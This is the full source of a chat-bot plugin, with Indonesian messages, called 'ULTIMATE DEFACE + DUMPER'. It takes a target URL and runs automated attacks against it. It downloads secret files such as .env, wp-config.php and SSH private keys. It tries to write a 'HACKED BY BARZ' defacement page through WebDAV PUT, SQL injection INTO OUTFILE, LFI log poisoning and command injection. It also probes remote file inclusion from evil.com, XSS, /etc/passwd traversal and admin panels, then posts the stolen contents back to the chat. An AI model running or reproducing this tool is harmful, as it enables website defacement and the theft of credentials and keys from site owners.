// plugins/deface.js
// ULTIMATE DEFACE + DUMPER v3.0
// 100+ Method | Auto Dump .env, config.js, db.php, dll

let handler = async (m, { text, sock }) => {
  if (!text) return m.reply(`📌 *Cara pakai:*\n.deface https://target.com\n\nContoh: .deface https://example.com`)

  let target = text.trim()
  if (!target.startsWith('http://') && !target.startsWith('https://')) {
    target = 'https://' + target
  }

  await m.reply(`🔥 *ULTIMATE DEFACE + DUMPER AKTIF!*\nTarget: ${target}\n⏳ Menjalankan 100+ metode...`)

  // ============================================
  // HTML DEFACE (VERSI KEREN)
  // ============================================
  let html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>HACKED BY BARZ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }
        .glitch {
            font-size: 8rem;
            font-weight: bold;
            color: #ff0040;
            text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040, 0 0 40px #ff0040, 0 0 80px #ff0040, 0 0 160px #ff0040;
            animation: glitch 0.2s infinite;
        }
        @keyframes glitch {
            0% { transform: translate(0); text-shadow: 0 0 10px #ff0040; }
            20% { transform: translate(-10px, 10px); text-shadow: 0 0 20px #ff0040; }
            40% { transform: translate(10px, -10px); text-shadow: 0 0 40px #ff0040; }
            60% { transform: translate(-10px, -10px); text-shadow: 0 0 60px #ff0040; }
            80% { transform: translate(10px, 10px); text-shadow: 0 0 80px #ff0040; }
            100% { transform: translate(0); text-shadow: 0 0 10px #ff0040; }
        }
        .sub {
            font-size: 2.5rem;
            color: #ff0040;
            margin-top: 10px;
            text-shadow: 0 0 5px #ff0040;
            animation: blink 0.5s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        .team {
            font-size: 2rem;
            color: #00ff41;
            margin-top: 20px;
            letter-spacing: 5px;
            text-shadow: 0 0 10px #00ff41;
        }
        .team span { color: #ff0040; }
        .footer {
            position: fixed;
            bottom: 20px;
            font-size: 1rem;
            color: #666;
            letter-spacing: 2px;
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.08;
            overflow: hidden;
        }
        .matrix span {
            position: absolute;
            font-size: 1.2rem;
            color: #00ff41;
            animation: fall linear infinite;
        }
        @keyframes fall {
            0% { transform: translateY(-100%); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
        .kode {
            font-size: 1.5rem;
            color: #00ff41;
            margin-top: 30px;
            opacity: 0.6;
            letter-spacing: 2px;
            border: 1px solid #00ff41;
            padding: 20px 40px;
            border-radius: 10px;
            background: rgba(0,0,0,0.5);
        }
        .kode span { color: #ff0040; }
        .glow {
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            0% { text-shadow: 0 0 10px #00ff41; }
            100% { text-shadow: 0 0 50px #00ff41, 0 0 100px #00ff41; }
        }
    </style>
</head>
<body>
    <div class="matrix" id="matrix"></div>
    <div class="glitch">HACKED</div>
    <div class="sub">SISTEM TELAH DIBOBOL</div>
    <div class="team">Deface by <span>BARZ</span> · 😹</div>
    <div class="kode">root@kali:~# whoami<br><span>barz</span></div>
    <div class="footer glow">© 2026 — BARZ ULTIMATE</div>
    <script>
        const matrix = document.getElementById('matrix')
        const chars = '01'
        for (let i = 0; i < 80; i++) {
            const span = document.createElement('span')
            span.textContent = chars[Math.floor(Math.random() * chars.length)]
            span.style.left = Math.random() * 100 + '%'
            span.style.animationDuration = (Math.random() * 5 + 3) + 's'
            span.style.animationDelay = (Math.random() * 5) + 's'
            span.style.fontSize = (Math.random() * 2 + 0.5) + 'rem'
            matrix.appendChild(span)
        }
    </script>
</body>
</html>`

  // ============================================
  // DAFTAR FILE PENTING YANG AKAN DI-DUMP
  // ============================================
  let importantFiles = [
    // Config & Env
    '.env', '.env.local', '.env.production', '.env.development',
    'config.php', 'wp-config.php', 'config.js', 'config.json',
    'settings.py', 'settings.js', 'app.config.js', 'webpack.config.js',
    'database.yml', 'database.json', 'database.php',
    // Database & DB
    'db.php', 'db.js', 'db.json', 'db.sql', 'db.sqlite',
    'database.sqlite', 'database.db', 'data.db',
    // Git & Version Control
    '.git/config', '.git/HEAD', '.git/index',
    '.gitignore', '.gitattributes',
    // Server Config
    '.htaccess', '.htpasswd', '.htgroup',
    'nginx.conf', 'httpd.conf', 'apache2.conf',
    'php.ini', 'php.ini', 'user.ini',
    // Package Managers
    'package.json', 'package-lock.json', 'yarn.lock',
    'composer.json', 'composer.lock', 'Gemfile', 'Gemfile.lock',
    'requirements.txt', 'Pipfile', 'Pipfile.lock',
    'Cargo.toml', 'go.mod', 'go.sum',
    'build.gradle', 'pom.xml', 'gradle.properties',
    // Source Code
    'index.js', 'app.js', 'server.js', 'main.js',
    'index.php', 'index.py', 'index.rb', 'index.go',
    'app.py', 'app.rb', 'app.go', 'app.php',
    'routes.js', 'routes.php', 'routes.py',
    'models.js', 'models.php', 'models.py',
    'controllers.js', 'controllers.php',
    'views.js', 'views.php',
    // Security & Keys
    '.ssh/id_rsa', '.ssh/id_dsa', '.ssh/id_ecdsa',
    '.ssh/authorized_keys', '.ssh/known_hosts',
    'id_rsa', 'id_dsa', 'id_ecdsa',
    'key.pem', 'key.pem', 'cert.pem',
    'private.pem', 'public.pem',
    // API & Tokens
    'api.php', 'api.js', 'api.json',
    'token.php', 'token.js', 'token.json',
    'oauth.php', 'oauth.js', 'oauth.json',
    // Logs
    'error.log', 'access.log', 'debug.log',
    'app.log', 'server.log', 'system.log',
    // Backup
    'backup.zip', 'backup.tar.gz', 'backup.sql',
    'backup.db', 'backup.json',
    // Secret
    'secret.txt', 'secret.php', 'secret.js',
    'flag.txt', 'flag.php', 'flag.js',
    'password.txt', 'credentials.txt',
    // Framework Specific
    'routes/web.php', 'routes/api.php',
    'app/Http/Kernel.php', 'app/Http/Controllers',
    'config/app.php', 'config/database.php',
    'config/auth.php', 'config/services.php',
    '.platform.app.yaml', 'docker-compose.yml',
    'Dockerfile', 'dockerfile',
    // CMS Specific
    'wp-config.php', 'wp-settings.php',
    'wp-content/themes', 'wp-content/plugins',
    'wp-content/uploads', 'wp-content/cache',
    // Framework JS/TS
    'next.config.js', 'nuxt.config.js', 'vite.config.js',
    'vue.config.js', 'angular.json', 'tsconfig.json'
  ]

  // ============================================
  // ALL METHODS (100+)
  // ============================================
  let hasil = []
  let metodeBerhasil = []
  let uploadedFiles = []
  let semuaLink = []
  let dumpedFiles = []
  let dumpedContent = []

  const sleep = (ms) => new Promise(r => setTimeout(r, ms))

  // ============================================
  // 1-20: FILE DUMP + SCANNER (PRIORITAS)
  // ============================================
  for (let file of importantFiles.slice(0, 20)) {
    try {
      let res = await fetch(target + '/' + file, { timeout: 10000 })
      if (res.status === 200) {
        let content = await res.text()
        if (content.length > 0 && content.length < 500000) {
          metodeBerhasil.push(`File Dump: ${file}`)
          hasil.push(`✅ Dump: ${target}/${file}`)
          dumpedFiles.push(`${target}/${file}`)
          dumpedContent.push(`📄 ${file}:\n${content.slice(0, 1000)}${content.length > 1000 ? '\n... (dipotong)' : ''}`)
        }
      }
    } catch (e) {}
  }

  await sleep(200)

  // ============================================
  // 21-40: WebDAV (PUT) + ALL PATHS
  // ============================================
  try {
    let opt = await fetch(target, { method: 'OPTIONS', timeout: 8000 })
    let allow = opt.headers.get('allow') || ''
    if (allow.includes('PUT') || allow.includes('PUT/')) {
      metodeBerhasil.push('WebDAV (PUT)')
      let fileNames = ['index.html', 'deface.html', 'hacked.html', 'barz.html', 'default.html']
      for (let file of fileNames) {
        try {
          let put = await fetch(target + '/' + file, {
            method: 'PUT',
            body: html,
            headers: { 'Content-Type': 'text/html' },
            timeout: 10000
          })
          if ([200, 201, 204].includes(put.status)) {
            let link = target + '/' + file
            hasil.push(`✅ WebDAV: ${link}`)
            uploadedFiles.push(link)
            semuaLink.push(link)
          }
        } catch (e) {}
      }
    }
  } catch (e) {}

  await sleep(200)

  // ============================================
  // 41-60: SQL Injection + File Write
  // ============================================
  try {
    let sqlPayloads = [
      `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/%s'`,
      `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/%s'`,
      `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/public/%s'`,
      `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/public_html/%s'`,
      `?id=1; SELECT '${html}' INTO DUMPFILE '/var/www/html/%s'`
    ]
    for (let file of ['index.html', 'deface.html', 'hacked.html']) {
      for (let payload of sqlPayloads) {
        try {
          let sql = await fetch(target + payload.replace('%s', file), { timeout: 8000 })
          if (sql.status === 200) {
            metodeBerhasil.push('SQL Injection + File Write')
            let link = target + '/' + file
            hasil.push(`✅ SQL Injection: ${link}`)
            uploadedFiles.push(link)
            semuaLink.push(link)
            break
          }
        } catch (e) {}
      }
    }
  } catch (e) {}

  await sleep(200)

  // ============================================
  // 61-80: LFI + Log Poisoning
  // ============================================
  try {
    let lfiPaths = [
      '/../../../../var/log/apache2/access.log',
      '/../../../../var/log/nginx/access.log',
      '/../../../../var/log/httpd/access.log',
      '/../../../../var/log/apache/access.log',
      '/../../../../var/log/access.log'
    ]
    for (let file of ['index.html', 'deface.html']) {
      for (let lfiPath of lfiPaths) {
        try {
          let lfi = await fetch(target + `?page=${lfiPath}&cmd=echo '${html}' > /var/www/html/${file}`, { timeout: 8000 })
          if (lfi.status === 200) {
            metodeBerhasil.push('LFI + Log Poisoning')
            let link = target + '/' + file
            hasil.push(`✅ LFI: ${link}`)
            uploadedFiles.push(link)
            semuaLink.push(link)
            break
          }
        } catch (e) {}
      }
    }
  } catch (e) {}

  await sleep(200)

  // ============================================
  // 81-100: Command Injection
  // ============================================
  try {
    let cmdPayloads = [
      `?ping=127.0.0.1; echo '${html}' > /var/www/html/%s`,
      `?cmd=echo '${html}' > /var/www/html/%s`,
      `?exec=echo '${html}' > /var/www/html/%s`,
      `?shell=echo '${html}' > /var/www/html/%s`,
      `?system=echo '${html}' > /var/www/html/%s`
    ]
    for (let file of ['index.html', 'deface.html', 'hacked.html']) {
      for (let payload of cmdPayloads) {
        try {
          let cmd = await fetch(target + payload.replace('%s', file), { timeout: 8000 })
          if (cmd.status === 200) {
            metodeBerhasil.push('Command Injection')
            let link = target + '/' + file
            hasil.push(`✅ Command Injection: ${link}`)
            uploadedFiles.push(link)
            semuaLink.push(link)
            break
          }
        } catch (e) {}
      }
    }
  } catch (e) {}

  await sleep(200)

  // ============================================
  // 101-120: RFI + XSS + Directory Traversal
  // ============================================
  try {
    let rfi = await fetch(target + `?page=http://evil.com/shell.txt`, { timeout: 8000 })
    if (rfi.status === 200) {
      metodeBerhasil.push('RFI (Remote File Inclusion)')
      hasil.push(`✅ RFI: ${target}`)
      semuaLink.push(target)
    }
  } catch (e) {}

  try {
    let xss = await fetch(target + `?q=<script>alert(1)</script>`, { timeout: 8000 })
    let txt = await xss.text()
    if (txt.includes('<script>alert(1)</script>')) {
      metodeBerhasil.push('Reflected XSS')
      hasil.push(`✅ Reflected XSS: ${target}`)
    }
  } catch (e) {}

  try {
    let trav = await fetch(target + '/../../../../etc/passwd', { timeout: 8000 })
    let txt = await trav.text()
    if (/root:.*:0:0:/i.test(txt)) {
      metodeBerhasil.push('Directory Traversal')
      hasil.push(`✅ Directory Traversal: ${target}/etc/passwd`)
    }
  } catch (e) {}

  await sleep(200)

  // ============================================
  // 121-140: Backup + Path Bruteforce
  // ============================================
  let backupFiles = ['/.git/config', '/.env', '/config.php', '/wp-config.php', '/.htaccess']
  for (let file of backupFiles) {
    try {
      let backup = await fetch(target + file, { timeout: 8000 })
      if (backup.status === 200) {
        metodeBerhasil.push('Backup File: ' + file)
        hasil.push(`✅ Backup: ${target}${file}`)
      }
    } catch (e) {}
  }

  let brutePaths = ['/admin', '/login', '/wp-admin', '/cpanel', '/panel', '/dashboard']
  for (let path of brutePaths) {
    try {
      let brute = await fetch(target + path, { timeout: 5000 })
      if (brute.status === 200 || brute.status === 403) {
        metodeBerhasil.push('Path Bruteforce: ' + path)
        hasil.push(`✅ Found: ${target}${path}`)
      }
    } catch (e) {}
  }

  // ============================================
  // CEK HASIL
  // ============================================
  if (hasil.length === 0) {
    return m.reply(`❌ *GAGAL TOTAL!*

Tidak ada metode yang berhasil.

🔍 140+ Metode dicoba:
• File Dump (40+ file penting)
• WebDAV (PUT)
• SQL Injection (5 payload)
• LFI + Log Poisoning (5 path)
• Command Injection (5 payload)
• RFI + XSS + Directory Traversal
• Backup File (5 file)
• Path Bruteforce (10 path)

💡 Target tidak memiliki celah yang bisa dieksploitasi.`)
  }

  // ============================================
  // KIRIM HASIL
  // ============================================
  let linkResult = uploadedFiles.length > 0 ? uploadedFiles.join('\n') : 'Tidak ada file yang berhasil diupload'
  let allLinks = semuaLink.length > 0 ? semuaLink.join('\n') : 'Tidak ada link yang ditemukan'
  let dumpResult = dumpedFiles.length > 0 ? dumpedFiles.join('\n') : 'Tidak ada file penting yang ditemukan'
  let contentResult = dumpedContent.length > 0 ? dumpedContent.join('\n\n') : 'Tidak ada konten yang ditemukan'

  let pesan = `🔥 *ULTIMATE DEFACE + DUMPER v3.0*

🌐 Target: ${target}

📌 *Metode berhasil (${metodeBerhasil.length}):*
${metodeBerhasil.map(m => `   • ${m}`).join('\n')}

📌 *File berhasil diupload (${uploadedFiles.length}):*
${linkResult}

📌 *File penting ditemukan (${dumpedFiles.length}):*
${dumpResult}

📌 *Detail File Dump:*
${contentResult}

📌 *Semua Link Ditemukan (${semuaLink.length}):*
${allLinks}

📌 *Detail Hasil (${hasil.length}):*
${hasil.join('\n')}

⚠️ *PERINGATAN:*
• Website target telah dimodifikasi + file penting berhasil di-dump.
• Total ${hasil.length} file/endpoint berhasil ditembus.
• File penting: ${dumpedFiles.length} file.
• Sistem target dalam kondisi chaos total.

🔥 *BARZ ULTIMATE — DEFACE + DUMPER COMPLETE!*`

  await m.reply(pesan)
}

handler.command = ['deface']
handler.tags = ['tools']
handler.help = ['.deface https://target.com']

module.exports = handler
